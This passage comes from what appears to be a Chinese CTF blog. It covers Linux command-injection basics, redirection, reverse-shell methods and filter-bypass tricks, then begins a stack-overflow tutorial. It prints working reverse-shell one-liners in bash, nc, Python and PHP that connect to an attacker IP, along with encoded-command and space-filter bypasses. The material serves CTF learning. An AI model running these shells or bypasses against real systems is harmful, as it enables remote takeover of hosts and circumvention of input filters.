src="image-20200622170910160.png" alt="image-20200622170910160"></p><h4 id="bzless"><a href="#bzless" class="headerlink" title="bzless"></a>bzless</h4><p>增强“.bz2”压缩包查看器，bzless比bzmore命令功能更加强大。在默认情况下翻页。</p><p>我们同样可以用反引号来进行指令替代</p><p><img src="image-20200622170834302.png" alt="image-20200622170834302"></p><h4 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h4><p>curl 通过文件协议来读取文件。</p><p>curl file:///home/coffee/flag</p><h3 id="2-目录读取"><a href="#2-目录读取" class="headerlink" title="2.目录读取"></a>2.目录读取</h3><h4 id="ls-命令"><a href="#ls-命令" class="headerlink" title="ls 命令"></a>ls 命令</h4><p>ls 用于查看参数目录下的文件。</p><p>基本用法：ls  文件路径</p><h4 id="dir"><a href="#dir" class="headerlink" title="dir"></a>dir</h4><p>与ls类似，用于查看参数目录下的文件。基本 用法：dir  文件路径</p><h3 id="3-重定向与命令替换"><a href="#3-重定向与命令替换" class="headerlink" title="3.重定向与命令替换"></a>3.重定向与命令替换</h3><h4 id="I-O重定向"><a href="#I-O重定向" class="headerlink" title="I / O重定向"></a>I / O重定向</h4><p>I / O重定向通俗的讲就是就是我们平时用到的那些就是经典的输出重定向<code>&gt;</code>和输入重定向<code>&lt;</code>.</p><p>但如过要深入点了解I / O重定向，还需要了解<strong>文件描述符。</strong></p><h5 id="文件描述符"><a href="#文件描述符" class="headerlink" title="文件描述符"></a>文件描述符</h5><p>在linux中，每个打开的文件都分配有一个文件描述符。但会保留描述符1到9。其中0</p><p>、1、2是默认打开文件stdin， stdout和stderr的 文件描述符。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0  是stdin（键盘设备文件） 又称为标准输入 ，是我们从键盘输入信息所在的文件</span><br><span class="line">1  是stdout（屏幕设备文件）又称为标准输出，是linux的正常输出信息。</span><br><span class="line">2  是stderr（错误消息输出到屏幕设备文件）又称为标准错误输出，是linux的错误输出信息。</span><br></pre></td></tr></table></figure><p>如果还不理解stdout与stderr，看下下面这张图。</p><p><img src="image-20200624205408985.png" alt="image-20200624205408985"></p><p>在<code>cat aa 1&gt;sss</code>时<code>cat aa</code>的标准输出未打印在屏幕上，而是重定向输出在文件sss里。</p><p>在<code>cat aa 2&gt;sss</code>时<code>cat aa</code>并未报错，所以标准输出打印在屏幕上且sss中的文件为NULL。</p><p>在<code>cat lexs 2&gt;sss</code>时由于没有lexs文件<code>cat lexs</code>有报错但是未打印在屏幕上，而是重定向输出在文件sss里。</p><h5 id="输入重定向"><a href="#输入重定向" class="headerlink" title="输入重定向"></a>输入重定向</h5><p>输入重定向是指把命令（或可执行程序）的标准输入重定向到指定的文件中。也就是说，输入可以不来自键盘，而来自一个指定的文件。所以说，输入重定向主要用于改变一个命令的输入源，特别是改变那些需要大量输入的输入源。如下图：</p><p><img src="image-20200624220701709.png" alt="image-20200624220701709"></p><p>如果给出一个文件名作为wc命令的参数，wc将会返回该文件文件名。如过以输入重定向的方式作为wc命令的参数，wc不会会返回该文件文件名。</p><p>输入重定向常用命令有:<code>&lt;</code>与<code>&lt;&lt;</code>，<code>&lt;</code>与<code>&lt;&lt;</code>是有区别的：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> &lt;用法：</span><br><span class="line">command &lt; 文件 #等同于command 0&lt; 文件 把文件当成输入源</span><br><span class="line"></span><br><span class="line">&lt;&lt;用法：</span><br><span class="line">&lt;&lt; tag</span><br><span class="line"> </span><br><span class="line"> 内容</span><br><span class="line">tag</span><br></pre></td></tr></table></figure><h5 id="输出重定向"><a href="#输出重定向" class="headerlink" title="输出重定向"></a>输出重定向</h5><p>输出重定向是指把命令（或可执行程序）的标准输出或标准错误输出重新定向到指定文件中。这样，该命令的输出就不显示在屏幕上，而是写入到指定文件。</p><p><img src="image-20200625000121103.png" alt="image-20200625000121103"></p><p>输出重定向与输入重定向相比，操作与命令更加丰富：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">command &gt; 文件 </span><br><span class="line"><span class="meta">#</span><span class="bash"> 相当于<span class="built_in">command</span> 1&gt;文件 <span class="built_in">command</span>标准输出就不显示在屏幕上，而是写入到指定文件。</span></span><br><span class="line"><span class="meta">#</span><span class="bash">这用法会覆盖文件里的内容</span></span><br><span class="line"></span><br><span class="line">command &gt;&gt; 文件 </span><br><span class="line"><span class="meta">#</span><span class="bash"> 相当于<span class="built_in">command</span> 1&gt;&gt;文件 <span class="built_in">command</span>标准输出就不显示在屏幕上，而是追加写入到指定文件。</span></span><br><span class="line"><span class="meta">#</span><span class="bash">这用法不会覆盖文件里的内容</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">command 1&gt; 文件 </span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="built_in">command</span>标准输出就不显示在屏幕上，而是写入到指定文件。</span></span><br><span class="line"><span class="meta">#</span><span class="bash">这用法会覆盖文件里的内容</span></span><br><span class="line"></span><br><span class="line">command 1&gt;&gt; 文件 </span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="built_in">command</span>标准输出就不显示在屏幕上，而是追加写入到指定文件。</span></span><br><span class="line"><span class="meta">#</span><span class="bash">这用法不会覆盖文件里的内容</span></span><br><span class="line"></span><br><span class="line">command 2&gt; 文件 </span><br><span class="line"><span class="meta">#</span><span class="bash"> 相当于<span class="built_in">command</span> 2&gt;文件 <span class="built_in">command</span>报错输出就不显示在屏幕上，而是写入到指定文件。</span></span><br><span class="line"><span class="meta">#</span><span class="bash">这用法会覆盖文件里的内容</span></span><br><span class="line"></span><br><span class="line">command 2&gt;&gt; 文件 </span><br><span class="line"><span class="meta">#</span><span class="bash"> 相当于<span class="built_in">command</span> 2&gt;&gt;文件 <span class="built_in">command</span>报错输出就不显示在屏幕上，而是追加写入到指定文件。</span></span><br><span class="line"><span class="meta">#</span><span class="bash">这用法不会覆盖文件里的内容</span></span><br><span class="line"></span><br><span class="line">command &amp;&gt; 文件 </span><br><span class="line"><span class="meta">#</span><span class="bash"> 类似于<span class="built_in">command</span> 1&gt;文件  2&gt;文件 或<span class="built_in">command</span> 1&gt;文件  2&gt;1 </span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="built_in">command</span>标准输出与报错输出就不显示在屏幕上，而是写入到指定文件。</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 这用法不会覆盖文件里的内容</span></span><br><span class="line"></span><br><span class="line">command &amp;&gt;&gt; 文件 </span><br><span class="line"><span class="meta">#</span><span class="bash"> 类似于<span class="built_in">command</span> 1&gt;&gt;文件  2&gt;&gt;文件 或 <span class="built_in">command</span> 1&gt;&gt;文件  2&gt;&gt;1</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="built_in">command</span>标准输出与报错输出就不显示在屏幕上，而是追加写入到指定文件。</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 这用法会不会覆盖文件里的内容</span></span><br></pre></td></tr></table></figure><p>部分用法展示</p><p><img src="image-20200625001228017.png" alt="image-20200625001228017"></p><p>另外说一下,<code>&amp;&gt;</code>与<code>&gt;&amp;</code>都允许将标准输出（文件描述符1）和标准错误输出（文件描述符2）都重定向到的文件里.如下图所示：</p><p><img src="image-20200625131259850.png" alt="image-20200625131259850"></p><p>看似<code>&amp;&gt;</code>与<code>&gt;&amp;</code>一样,但如果重定向的是文件描述符时,两者这有点细微的:</p><p><img src="image-20200625125440515.png" alt="image-20200625125440515"></p><p>注意！在当前目录下,有个名为1的文件！！！</p><p>我们在执行<code>ls 1&amp;&gt;sss</code>时，<code>&amp;&gt;</code>把<code>ls 1</code>当成一条命令运行重定向到sss里。</p><p>相当于执行的是<code>(ls 1)   &amp;&gt;sss</code>。</p><p>我们在执行<code>ls 1&gt;&amp;sss</code>时，<code>&amp;&gt;</code>把<code>ls</code>当成一条命令运行重定向到sss里。</p><p>相当于执行的是<code>(ls)   1&amp;&gt;sss</code>。</p><h4 id="命令替换"><a href="#命令替换" class="headerlink" title="命令替换"></a>命令替换</h4><p>命令替换是指将命令的标准输出作为值赋给某个变量，bash Shell定义了两种形式进行命令的替换，两种形式的语法格式如下：  </p><p> 方式一：  `Linux命令` </p><p> 方式二： $（Linux命令） </p><p><img src="image-20200626001300485.png" alt="image-20200626001300485"></p><p> 注意：尽管$（）和反引号在命令替换上是等价的，但是，$（）形式的命令替换是可以嵌套的。</p><h3 id="4-反弹shell"><a href="#4-反弹shell" class="headerlink" title="4.反弹shell"></a>4.反弹shell</h3><h4 id="方法1：shell命令反弹"><a href="#方法1：shell命令反弹" class="headerlink" title="方法1：shell命令反弹"></a>方法1：shell命令反弹</h4><p>利用shell 命令来进行shell反弹.</p><p>在进攻机上执行监听命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp (port)   <span class="comment">#port 为监听的端口</span></span><br></pre></td></tr></table></figure><p>在被攻击机器上执行命令:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/(ip)/(port) 0&gt;&amp;1</span><br><span class="line"><span class="comment">#ip为攻击机ip地址 port 为攻击机上开放的端口</span></span><br></pre></td></tr></table></figure><p>（有些情况下bash可以用sh来代替。）</p><p>按自己的理解解释下这命令：</p><p><code>bash -i</code> 命令行的交互模式.</p><p><code>/dev/tcp/(ip)/(port)</code>指远程，也就是攻击机.</p><p>所以<code>bash -i &gt;&amp; /dev/tcp/(ip)/(port)</code>就是将命令行的交互的输出重定向( stdout和stderr)到攻击机.</p><p> <code>0&gt;&amp;1</code>将命令行的交互的输入重定向( stdin)到攻击机.</p><p><img src="image-20200627115610170.png" alt="image-20200627115610170"></p><p>效果展示:</p><p><img src="image-20200627120409808.png" alt="image-20200627120409808"></p><h4 id="方法2-利用nc反弹"><a href="#方法2-利用nc反弹" class="headerlink" title="方法2:利用nc反弹"></a>方法2:利用nc反弹</h4><p>使用nc反弹shell，被攻击机反弹shell命令如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/bash  ip   port    # ip   port指攻击机的ip与port</span><br></pre></td></tr></table></figure><p>攻击接听命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nlvp (port)   # port指攻击机的port</span><br></pre></td></tr></table></figure><p>nc监听端口反弹shell时都会有一个警告：Warning: forward host lookup failed for bogon: Unknown host,根据nc帮助文档的提示加上-n参数就可以不产生这个警告了，-n参数代表在建立连接之前不对主机进行dns解析。</p><p><img src="image-20200627171230472.png" alt="image-20200627171230472"></p><p>这里的-e后面跟的参数代表的是在创建连接后执行的程序，这里代表在连接到远程后可以在远程执行一个本地shell(/bin/bash)，也就是反弹一个shell给远程，可以看到远程已经成功反弹到了shell，并且可以执行命令。但弹了命令没有弹用户、位置及权限信息。</p><p>若-e 不能使用，可以利用到linux中的管道符。攻击机上开两个端口来监听。例如：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 7777</span><br><span class="line"></span><br><span class="line">nc -nvlp 8888</span><br></pre></td></tr></table></figure><p>被攻击上执行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.14.200 7777|/bin/bash|nc 192.168.14.200 8888</span><br></pre></td></tr></table></figure><p>这样在攻击机上一个端口发送命令一个端口接收回显。</p><p><img src="image-20200627174232125.png" alt="image-20200627174232125"></p><h4 id="方法3-利用python反弹"><a href="#方法3-利用python反弹" class="headerlink" title="方法3:利用python反弹"></a>方法3:利用python反弹</h4><p>使用python反弹，被攻击机反弹shell命令如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python -c "import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('ip',port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);"</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">ip port 为攻击机的端口</span></span><br></pre></td></tr></table></figure><p>在进攻机上执行监听命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp (port)   <span class="comment">#port 为监听的端口  可以在前面加个n</span></span><br></pre></td></tr></table></figure><p>下面来解释一下python反弹shell的原理。</p><p>首先使用socket与远程建立起连接，接下来使用到了os库的dup2()将标准输入、标准输出、标准错误输出重定向到远程，dup2()这个方法有两个参数，分别为文件描述符fd1和fd2，当fd2参数存在时，就关闭fd2，然后将fd1代表的那个文件强行复制给fd2。（可以理解成重定向的作用，fd2 &gt;&amp; fd1 ）.</p><p>s.fileno()是s的文件描述符，而s指代攻击机。所以s.fileno()就代表攻击机。</p><p>使用os.subprocess在本地开启一个子进程，传入参数“-i”使bash以交互模式启动，标准输入、标准输出、标准错误输出又被重定向到了s.fileno()(攻击机），这样的话就可以在攻击机远程执行输入命令了。</p><p>效果展示:</p><p><img src="image-20200627165202955.png" alt="image-20200627165202955"></p><h4 id="方法4-利用php反弹"><a href="#方法4-利用php反弹" class="headerlink" title="方法4:利用php反弹"></a>方法4:利用php反弹</h4><h5 id=""><a href="#" class="headerlink" title=""></a></h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r '$sock=fsockopen("ip",port);exec("/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span><br></pre></td></tr></table></figure><p>我们利用fsockopen函数建立socket连接攻击机。其中3代表的是使用fsockopen函数建立socket返回的文件描述符，然后将将标准输入，标准输出和标准错误输出都重定向到了3（攻击机）。</p><p>php关闭safe_mode这个选项，才可以使用exec函数。</p><h2 id="常见bypass"><a href="#常见bypass" class="headerlink" title="常见bypass"></a>常见bypass</h2><h3 id="敏感字符过滤绕过"><a href="#敏感字符过滤绕过" class="headerlink" title="敏感字符过滤绕过"></a>敏感字符过滤绕过</h3><h4 id="利用-符号"><a href="#利用-符号" class="headerlink" title="利用\符号"></a>利用<code>\</code>符号</h4><p><code>\</code>符号,会将两字符串拼成一个字符串来使用.例如下拼接cat</p><p><img src="image-20200622151501398.png" alt="image-20200622151501398"></p><p>在网页中，使用%0a(\n)，%0d(\r)，%09(\t)等字符也可以bypass</p><h4 id="利用特殊变量"><a href="#利用特殊变量" class="headerlink" title="利用特殊变量"></a>利用特殊变量</h4><p>在bash环境中，有些的特殊变量都是为空的.可以夹着关键字中绕过,如’fla$*g’可以绕过对’flag’的过滤.</p><p> 在可以使用的特殊变量有:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">* <span class="comment">#传递给脚本或函数的所有参数</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash">@ <span class="comment">#传递给脚本或函数的所有参数</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash">n <span class="comment">#传递给脚本或函数的第n个参数。n要求大于0(0表脚本或函数名),如大于一位数则要加括号,例如$&#123;11&#125;</span></span></span><br></pre></td></tr></table></figure><p>效果：</p><p><img src="image-20200627230932315.png" alt="image-20200627230932315"></p><p>按照我们理解特殊变量中‘传递给脚本或函数的参数’这个概念是指运行的一个函数or脚本内，所接受到的参数，然不是我们对一个将要运行的传递给脚本或函数的参数。如下：</p><p><img src="image-20200627225514904.png" alt="image-20200627225514904"></p><p>我们输出$0 看到的是bash，输出$<em>看到的是空，说明特殊变量指代的是bash这个脚本运行时的传递给*</em>这个（bash）脚本参数**而不是将要运行echo 的参数。</p><h4 id="使用变量"><a href="#使用变量" class="headerlink" title="使用变量"></a>使用变量</h4><p>我们可以通过变量，来分隔组合来进行一些绕过或者配合${}进行切片。</p><p>分隔组合：若ls 被禁，我们可以‘a=l ;b=s ;$a$b ’</p><p><img src="image-20200627235623856.png" alt="image-20200627235623856"></p><p>配合${} 切片：若ls 被禁，我们可以‘a=”12l23s”;b=${a:2:1}${a:5:1};$b ’</p><p><img src="image-20200627235921501.png" alt="image-20200627235921501"></p><h4 id="通配符-和-的使用"><a href="#通配符-和-的使用" class="headerlink" title="通配符*和?的使用"></a>通配符*和?的使用</h4><p>我们可以用于通配符*和?，来替换部分关键字。*可以匹配多个，？只能代替一个。</p><p><img src="image-20200628000212714.png" alt="image-20200628000212714"></p><p>同时,因为*和?优先匹配的下当前目录下的文件名:</p><p><img src="image-20200812224449425.png" alt="image-20200812224449425"></p><p>且在单独用通配符*时,bash会把匹配的第一个文件名当成命令,其余当成参数来执行:</p><p><img src="image-20200812225533013.png" alt="image-20200812225533013"></p><h4 id="和-的使用"><a href="#和-的使用" class="headerlink" title="[]和{}的使用"></a>[]和{}的使用</h4><p>用[]or{}在一个范围内进行替代。</p><p><img src="image-20200628000431773.png" alt="image-20200628000431773"></p><p>注意：[]和{}有点细微差别。</p><p><img src="image-20200628000634120.png" alt="image-20200628000634120"></p><h4 id="使用双引号和单引号"><a href="#使用双引号和单引号" class="headerlink" title="使用双引号和单引号"></a>使用双引号和单引号</h4><p>使用双引号和单引号，隔离拼接关键字来进行绕过。</p><p><img src="image-20200628001117125.png" alt="image-20200628001117125"></p><h4 id="使用编码"><a href="#使用编码" class="headerlink" title="使用编码"></a>使用编码</h4><p>可以用编码绕过的有点多，如：rot13，base64,16进制,8进制这里只提几种典型。</p><h5 id="base64编码"><a href="#base64编码" class="headerlink" title="base64编码"></a>base64编码</h5><p>可以解base64来绕过</p><p>例：<code>echo Y2F0IGFh|base64 -d|bash</code>（Y2F0IGFh解码为cat aa）</p><p><img src="image-20200628002338274.png" alt="image-20200628002338274"></p><h5 id="16进制编码"><a href="#16进制编码" class="headerlink" title="16进制编码"></a>16进制编码</h5><p>可以通过解16进制来绕过</p><p>例：<code>echo 6c73 | xxd -r -p|bash</code>（6c73解码为ls）</p><p><img src="image-20200628003502909.png" alt="image-20200628003502909"></p><p>例：<code>$(printf &#39;\x6c\x73&#39;)</code>（\6c\73解码为ls）ps：注意引号！</p><p><img src="image-20200628003629986.png" alt="image-20200628003629986"></p><h5 id="8进制"><a href="#8进制" class="headerlink" title="8进制"></a>8进制</h5><p>可以解8进制来绕过</p><p>例：<code>$(printf &#39;\154\163&#39;)</code> （\154\163解码为ls）</p><p><img src="image-20200628003127015.png" alt="image-20200628003127015"></p><h3 id="空格过滤绕过"><a href="#空格过滤绕过" class="headerlink" title="空格过滤绕过"></a>空格过滤绕过</h3><p>在空格被过滤后,如何分割传参是一个问题?我找到以下几个方法:</p><p>(1)  $IFS是linux shell 中的一种特殊的变量,默认条件下,IFS 的值，默认是 space, tab, newline这三个值在shell中都有分割参数的意思.但要注意的$IFS不能直接被shell识别,要${IFS}或$IFS$9提醒shell 是$IFS变量.</p><p>(2)利用输入重定向也是分割参数代替空格的好方法.</p><p><img src="image-20200628171815237.png" alt="image-20200628171815237"></p><p>(3)活用{}也能巧妙代替空格分离参数方法.</p><p><img src="image-20200628211605803.png" alt="image-20200628211605803"></p><h3 id="ip地址过滤绕过"><a href="#ip地址过滤绕过" class="headerlink" title="ip地址过滤绕过"></a>ip地址过滤绕过</h3><p>网络地址除了我们所知道’127.0.0.1’.网络地址有另外一种表示形式，就是数字地址,比如127.0.0.1’的10进制数字地址就是’2130706433’、16进制数字地址就是’0x7f000001’。</p><p><img src="image-20200628110922775.png" alt="image-20200628110922775"></p><p>附带一个自己写的渣转化ip的python脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ipv4_addr_check</span><span class="params">(ipAddr)</span>:</span></span><br><span class="line">    p = re.compile(<span class="string">'^((25[0-5]|2[0-4]\d|[01]?\d\d?)\.)&#123;3&#125;(25[0-5]|2[0-4]\d|[01]?\d\d?)$'</span>)</span><br><span class="line">    <span class="keyword">if</span> p.match(ipAddr):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ipv4_addr_change</span><span class="params">(ipAddr)</span>:</span></span><br><span class="line">    List=ipAddr.split(<span class="string">'.'</span>)</span><br><span class="line">    IP=<span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> List:</span><br><span class="line">        i=bin(int(i))[<span class="number">2</span>:]</span><br><span class="line">        n=<span class="number">8</span>-len(i)</span><br><span class="line">        IP=IP+<span class="string">'0'</span>*n+i</span><br><span class="line">    print(<span class="string">'dec ip is'</span>,int(<span class="string">'0b'</span>+IP,<span class="number">2</span>))</span><br><span class="line">    print(<span class="string">'hex ip is '</span>,hex(int(<span class="string">'0b'</span>+IP,<span class="number">2</span>)))</span><br><span class="line">   </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    x=<span class="string">'127.0.0.1'</span></span><br><span class="line">    <span class="keyword">if</span> ipv4_addr_check(x):</span><br><span class="line">       ipv4_addr_change(x)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">'it is not ipv4'</span>)</span><br></pre></td></tr></table></figure><h4 id="长度限制绕过"><a href="#长度限制绕过" class="headerlink" title="长度限制绕过"></a>长度限制绕过</h4><p>如果shell对一次性输入的命令有长度限制比如一次不超过8个字符。我们可以通过’\‘符号可以拼接命令的特性、’ls -t’可以把文件按规律排序、sh or bash 把接收的参数当命令执行的特点。将命令写成有规律的文件名 ，再通过’ls -t’ 与 sh  排序执行。</p><p>以<code>cat -n flag.txt</code>为例：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash">g.txt   <span class="comment">#命名倒着写，命令最后的写前面</span></span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">fla\\   <span class="comment">#注意第二个文件起要加\号且要转义</span></span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"><span class="string">'t -n \'</span> <span class="comment">#可以使用‘’号但是要耗掉2个字符长度，另外注意空格</span></span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">ca\\</span></span><br><span class="line">ls -t&gt;a</span><br><span class="line">sh a</span><br></pre></td></tr></table></figure><p>效果：</p><p><img src="image-20200628214136448.png" alt="image-20200628214136448"></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>恍恍惚惚地发现总结这些关于linux的常用的姿势，居然断断续续用了近天的时间。对于这些知识，有的平时在看payload时感觉很简单。但是在静下心来分析原理时，就会发现有很多看似简单的东西，背后细节不一般，比如重定向‘&gt;&amp;’与’&amp;&gt;’的含义异同；特殊变量’$*’与‘$@’的取值；长度限制绕过文件编写要注意命名的分割。花这么多时间整理下来，也学到很多意想不到的知识。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://mp.weixin.qq.com/s/Hm6TiLHiAygrJr-MGRq9Mw" target="_blank" rel="noopener">巧用命令注入的N种方式</a></p><p><a href="https://www.cnblogs.com/Tkitn/p/11661017.html" target="_blank" rel="noopener">CTF中的命令执行绕过方式</a></p><p><a href="https://xz.aliyun.com/t/3918" target="_blank" rel="noopener">Bypass一些命令注入限制的姿势</a></p><p><a href="https://blog.csdn.net/weixin_43921596/article/details/86638919" target="_blank" rel="noopener">Linux下绕过空格的方式总结</a></p><p><a href="https://superuser.com/questions/335396/what-is-the-difference-between-and-in-bash" target="_blank" rel="noopener">&gt;&amp;与&amp;&gt;有区别吗</a></p><p><a href="http://www.tldp.org/LDP/abs/html/io-redirection.html" target="_blank" rel="noopener">linux重定向</a></p><p><a href="https://www.freebuf.com/articles/system/178150.html" target="_blank" rel="noopener">Linux下几种反弹Shell方法的总结与理解</a></p><p><a href="https://blog.csdn.net/nzjdsds/article/details/102873187" target="_blank" rel="noopener">7位可控字符下的任意命令执行</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>学习pwn小记(1)</title>
      <link href="/2020/09/09/%E5%AD%A6%E4%B9%A0pwn%E5%B0%8F%E8%AE%B0(1)/"/>
      <url>/2020/09/09/%E5%AD%A6%E4%B9%A0pwn%E5%B0%8F%E8%AE%B0(1)/</url>
      
        <content type="html"><![CDATA[<p>某年某日,应队伍缺pwn,故学习于ctf-wiki.学其有感,写文以记之。</p><a id="more"></a><h2 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。</p><p><img src="image-20200909214148691.png" alt="image-20200909214148691"></p><p>如图，想要利用触发栈溢出程序必须向<strong>栈上写入数据</strong>和<strong>写入的数据大小没有被良好地控制</strong></p><h3 id="寻找危险函数"><a href="#寻找危险函数" class="headerlink" title="寻找危险函数"></a>寻找危险函数</h3><h4 id="关于输入的危险函数"><a href="#关于输入的危险函数" class="headerlink" title="关于输入的危险函数"></a>关于输入的危险函数</h4><p>​    gets()，直接读取一行，忽略’\x00’<br>​            scanf()<br>​            vscanf()</p><h4 id="关于输出的危险函数"><a href="#关于输出的危险函数" class="headerlink" title="关于输出的危险函数"></a>关于输出的危险函数</h4><p>   sprintf()</p><h4 id="关于字符串操作的危险函数"><a href="#关于字符串操作的危险函数" class="headerlink" title="关于字符串操作的危险函数"></a>关于字符串操作的危险函数</h4><p>​    strcpy，字符串复制，遇到’\x00’停止<br>​            strcat，字符串拼接，遇到’\x00’停止<br>​            bcopy</p><h3 id="确定填充长度"><a href="#确定填充长度" class="headerlink" title="确定填充长度"></a>确定填充长度</h3><p>这一部分主要是计算我们所要操作的地址与我们所要覆盖的地址的距离。常见的操作方法就是打开 IDA，根据其给定的地址计算偏移。一般变量会有以下几种索引模式</p><ul><li>相对于栈基地址的的索引，可以直接通过查看 EBP 相对偏移获得</li><li>相对应栈顶指针的索引，一般需要进行调试，之后还是会转换到第一种类型。</li><li>直接地址索引，就相当于直接给定了地址。</li></ul><p>一般来说，我们会有如下的覆盖需求</p><ul><li>覆盖函数返回地址，这时候就是直接看 EBP 即可。</li><li>覆盖栈上某个变量的内容，这时候就需要更加精细的计算了。</li><li>覆盖 bss 段某个变量的内容。</li><li>根据现实执行情况，覆盖特定的变量或地址的内容。</li></ul><p>ps：我们覆盖某个地址的目的是为了让程序读取我们覆盖的恶意地址来达到我们的目的，执行我们想要执行的东西。</p><h2 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h2><p>emm,这道题保护只开了栈不可执行,对我来说影响深刻的反而是找buf的大小的问题。</p><p><img src="image-20200911231138664.png" alt="image-20200911231138664"></p><p>照着以前对pwn薄弱理解，打开ide看到了：</p><p><img src="image-20200911220549058.png" alt="image-20200911220549058"></p><p>然后照ebp算出的要溢出：0x64+4个（104）字符才能溢出到返回地址。</p><p>但是在gdb出来却是：</p><p><img src="image-20200911110700992.png" 